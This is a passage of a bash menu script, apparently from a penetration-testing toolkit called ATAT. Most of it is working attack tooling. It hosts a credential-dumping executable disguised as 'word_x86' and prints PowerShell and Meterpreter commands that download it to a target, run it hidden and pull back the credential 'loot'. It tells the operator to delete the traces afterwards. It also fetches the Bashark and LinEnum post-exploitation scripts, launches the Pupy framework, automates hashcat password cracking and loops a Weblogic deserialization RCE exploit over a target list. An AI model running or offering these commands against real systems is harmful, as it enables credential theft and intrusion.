	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi 
	cp ~/ATAT/word_x86.txt /var/www/html/word_x86.txt
	chown www-data:www-data /var/www/html/word_x86.txt
	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x86.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x86.exe): ' pshuserpath;
		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
		echo -e "\E[1;34m\e[97m \e[31m powershell (new-object System.Net.WebClient).DownloadFile('http://$userhost/word_x86.txt','$pshuserpath')\e[97m\E[1;34m"
			
        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x86.txt $msfuserpath \e[97m\E[1;34m"
        echo ""
		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m word_x86.exe all -vv -oA \e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
		echo ""
		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
		echo ""
		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
		echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The \"credentials_xxxxxxxx_xxxxxx\" TXT & JSON Files & word_x86.exe \E[1;34m:::::"
			;;
		"Bashark")
   	echo -e "\E[1;34m::::: \e[97mDownloading Bashark Post Exploitation Script... \E[1;34m:::::"
         wget https://github.com/TheSecondSun/Bashark/blob/master/bashark.sh -O bash.sh
    echo -e "\E[1;34m::::: \e[97mMove \"bash.sh\" To Target \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mType \"source bash.sh\" To Launch Bashark Framework \E[1;34m:::::"      
            ;;
        "Pupy")
	echo -e "\E[1;34m::::: \e[97mLaunching Pupy Cross-Platform Post Exploitation Framework... \E[1;34m:::::"
	cd ~/pupy
	export PATH=$PATH:~/.local/bin
	pupysh-update
	pupysh
		    ;;
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

"12" | "12" ) 
  echo -e "\E[1;34m::::: \e[97mJust Float Away...With The Rest OF The Garbage\E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mStop Running Services & Remove Tracks From Your Campaigns \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 3=Main Menu | 4=QUIT: '
options=("Stop Running Services" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Stop Running Services")	
	service apache2 stop
	  echo -e "\E[1;34m::::: \e[97mStopped Running Apache2 Service \E[1;34m:::::"
		    ;;
#		"Data Exfiltration")	
#	read -p 'Enter Remote File On Target Including Full Path (C:\\\\\Users\\\\\Profile\\\\\filename.ext): ' remoteuserfile; read -p 'Enter File Destination Full Path on Local Machine for MSF (/root/file.ext): ' msflocaluserpath; #read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Local Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
#		echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
 #       echo download \"$remoteuserfile\" \"$msflocaluserpath\"
	#	    ;;
		"Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 		      

;;

"13" | "13" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mPrivilege Escalation Methods \E[1;34m:::::"
  PS3='Enter your choice: ENTER=Options Menu | 5=Main Menu | 6=QUIT: '
options=("BeRoot Windows" "BeRoot Linux" "LinEnum" "Hashcat Password Recovery" "Main Menu" "Quit" )
select opt in "${options[@]}"
do
    case $opt in
		"BeRoot Windows")
	cd ~/BeRoot/Windows
	cat README.md
	echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
			;;
		"BeRoot Linux")
	cd ~/BeRoot/Linux
	cat README.md
	echo -e "\E[1;34m::::: \e[97m \E[1;34m:::::"
			;;
		"LinEnum")
	echo -e "\E[1;34m::::: \e[97mDownloading LinEnum Privilege Escalation Checking Script... \E[1;34m:::::"
            wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh -O en.sh
    echo -e "\E[1;34m::::: \e[97mMove \"en.sh\" To Target \E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mType \"./LinEnum.sh -r report -e /tmp/ \" To Launch A Quick LinEnum Scan \E[1;34m:::::" 
	echo -e "\E[1;34m::::: \e[97mType \"./LinEnum.sh -r report -e /tmp/ -t\" To Launch A Thorough LinEnum Scan \E[1;34m:::::" 
	echo -e "\E[1;34m::::: \e[97mYour Completed LinEnum Report Can Be Found On Your Target Here: /tmp/report \E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDon't Forget To Delete The Report On Your Target Once You're Done - \"rm /tmp/report\" \E[1;34m:::::"
			;;
		"Hashcat Password Recovery")
cat << "EOF"
<Common Hash Mode Numbers>:
   + MD4 [900]
   + MD5 [0]
   + SHA1 [100]
   + SHA2-256 [1400]
   + SHA2-512 [1700]
   + NetNTLMv2 [5600]
   + phpBB3/WordPress/Joomla >= 2.5.18 (MD5) [400]
   + PostgreSQL [12]
   + MSSQL (2000) [131]
   + MSSQL (2005) [132]
   + MSSQL (2012, 2014) [1731]
   + MySQL323 [200]
   + MySQL4.1/MySQL5 [300]
   + NTLM [1000]
   + LM [3000]
   + Domain Cached Credentials (DCC), MS Cache [1100]
   + Domain Cached Credentials 2 (DCC2), MS Cache 2 [2100]
   + bcrypt $2*$, Blowfish (Unix) [3200]
   + sha256crypt $5$, SHA256 (Unix) [7400]
   + sha512crypt $6$, SHA512 (Unix) [1800]
   + macOS v10.4, MacOS v10.5, MacOS v10.6 [122]
   + macOS v10.7 [1722]
   + macOS v10.8+ (PBKDF2-SHA512) [7100]
   + Samsung Android Password/PIN [5800]
   + Windows Phone 8+ PIN/password [13800]
   + WPA-EAPOL-PBKDF2 [2500]

 ::::::::::::::::::Hashcat GPU Cracking For Empire Worthy Hardware:::::::::::::::::::::::::::::
 :::::::Crack w/ Hashes Only Option Whenever Possible For Greatly Increased Speed::::::::::::::
 ::Usernames & Hashes Option Works For pwdump Type Output With Usernames Present In Dump File::
 ::::::::Run The "Hashcat Install" From The Dependency Checker BEFORE Using This Option::::::::
EOF

echo ""

PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
options=("Brute-Force - Hashes Only" "Brute-Force - Usernames & Hashes" "Dictionary Rule Based Attack - Hashes Only" "Dictionary Rule Based Attack - Usernames & Hashes" "Resume Session" "Main Menu" "Quit")
select opt in "${options[@]}"
	do
		case $opt in
		"Brute-Force - Hashes Only")
		read -p 'Enter Session Name: ' usersession; read -p 'Enter Hash Mode: ' usermode; read -p 'Enter Minimum Password Length: ' usermin; read -p 'Enter Maximum Password Length (26 max): ' usermax; read -p 'Enter Output File (Full Path w/ File Extension): ' userout; read -p 'Enter Hash File (Full Path w/ File Extension): ' userhashes;
    ~/hashcat/hashcat64.bin --session $usersession -D 2 -a 3 -m $usermode --custom-charset1 ?a -i --increment-min=$usermin --increment-max=$usermax -o $userout $userhashes ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a -O
            echo -e "\E[1;34m::::: \e[97mRecovery Complete. All Results Can Be Found in" \'$userout\' "\E[1;34m:::::"
            ;;
        "Brute-Force - Usernames & Hashes")
		read -p 'Enter Session Name: ' usersession; read -p 'Enter Hash Mode: ' usermode; read -p 'Enter Minimum Password Length: ' usermin; read -p 'Enter Maximum Password Length (26 max): ' usermax; read -p 'Enter Output File (Full Path w/ File Extension): ' userout; read -p 'Enter Hash File (Full Path w/ File Extension): ' userhashes;
    ~/hashcat/hashcat64.bin --username --session $usersession -D 2 -a 3 -m $usermode --custom-charset1 ?a -i --increment-min=$usermin --increment-max=$usermax -o $userout $userhashes ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a -O
            echo -e "\E[1;34m::::: \e[97mRecovery Complete. All Results Can Be Found in" \'$userout\' "\E[1;34m:::::"
            ;;
        "Dictionary Rule Based Attack - Hashes Only")
		read -p 'Enter Session Name: ' usersession; read -p 'Enter Hash Mode: ' usermode; read -p 'Enter Output File (Full Path w/ File Extension): ' userout; read -p 'Enter Hash File (Full Path w/ File Extension): ' userhashes; read -p 'Enter Dictionary File (Full Path w/ File Extension): ' userdic;
    ~/hashcat/hashcat64.bin --session $usersession -D 2 -a 0 -m $usermode -o $userout $userhashes $userdic -r ~/hashcat/rules/OneRuleToRuleThemAll.rule -O
            echo -e "\E[1;34m::::: \e[97mRecovery Complete. All Results Can Be Found in" \'$userout\' "\E[1;34m:::::"
            ;;
        "Dictionary Rule Based Attack - Usernames & Hashes")
		read -p 'Enter Session Name: ' usersession; read -p 'Enter Hash Mode: ' usermode; read -p 'Enter Output File (Full Path w/ File Extension): ' userout; read -p 'Enter Hash File (Full Path w/ File Extension): ' userhashes; read -p 'Enter Dictionary File (Full Path w/ File Extension): ' userdic;
    ~/hashcat/hashcat64.bin --username --session $usersession -D 2 -a 0 -m $usermode -o $userout $userhashes $userdic -r ~/hashcat/rules/OneRuleToRuleThemAll.rule -O
            echo -e "\E[1;34m::::: \e[97mRecovery Complete. All Results Can Be Found in" \'$userout\' "\E[1;34m:::::"
            ;;
        "Resume Session")
    	read -p 'Enter Session Name: ' usersession;
    ~/hashcat/hashcat64.bin --session $usersession --restore
			;;           
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
		esac
	done
	        ;;
		"Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

  "14" | "14" )
  echo -e "\E[1;34m::::: \e[97mImperial Research Laboratory \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97m***Unstable / Under-Developed Weaponry*** \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mFire Safety Protocols & All Appropriate Safety Percautions Are Required \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
options=("Weblogic Java Deserialization RCE" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Weblogic Java Deserialization RCE")
	    echo -e "\E[1;34m::::: \e[97mThis Will Attempt To Exploit A Java Deserializatoin RCE Vulnerability In Weblogic \E[1;34m:::::"		
	    echo -e "\E[1;34m::::: \e[97mIf Successful, A Ping Command Will Be Executed On The Target Machine \E[1;34m:::::"
	    echo -e "\E[1;34m::::: \e[97mThis Will Result In IMCP Echo Packets Showing Up In Yout TCPDUMP Window From The Target IP \E[1;34m:::::" 
	xterm -e tcpdump -nni eth0 -e icmp[icmptype] == 8 &
	read -p 'Set PORT (usually 7001): ' userport;	
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
        xterm -e python weblogic_LinuxPing.py $IP $userport &
        sleep 3
    done    
			echo -e "\E[1;34m::::: \e[97mIF THIS FAILS TO GENERATE ICMP RESPONSES IN YOUR TCPDUMP WINDOW ON YOUR FIRST TRY, TRY AGAIN AT LEAST ONE OR TWO MORE TIMES! \E[1;34m:::::" 
			echo -e "\E[1;34m::::: \e[97mThe command may need to be run several times until ping replies are seen in the first terminal window (the one that has tcpdump running). \E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mTake screen shots of both terminal windows after successful RCE to demonstrate the exploitability of the vulnerability for your report. \E[1;34m:::::"
            echo ""
			;;
		"Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;

"00" | "00" ) 
  echo -e "\E[1;34m::::: \e[97mReset & Recharge \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mRemoving All Results From Prior Campaigns... \E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mThis Does NOT remove Any Password Cracking/Captured Hash Output \E[1;34m:::::"
	sleep 10
  rm ~/ATAT/SNMP_logs.txt
  rm ~/ATAT/LBD_Results.txt
  rm ~/ATAT/rc4.txt
  rm ~/ATAT/sslv2.txt
  rm ~/ATAT/heartbleed_targets.txt
  rm ~/ATAT/freak.txt
  rm ~/ATAT/weak_ciphers.txt
  rm ~/ATAT/expired_certs.txt
  rm ~/ATAT/ssl_certs.txt
  rm ~/ATAT/~SSLScan_masscan_results.txt
  rm ~/ATAT/SSLScan_nmap_results.txt
  rm ~/ATAT/~SSLScan_Results.txt
  rm ~/ATAT/Open_Ports.txt
  ~/ATAT/ATAT.sh

;;

"0" | "0" )
  # 
    echo -e "\E[1;34m::::: \e[97mIt's Over For Now... \E[1;34m:::::"
    echo "Aufiederszehn" && exit 1 

;;
   
esac

tput sgr0                               # Reset colors to "normal."

exit 0
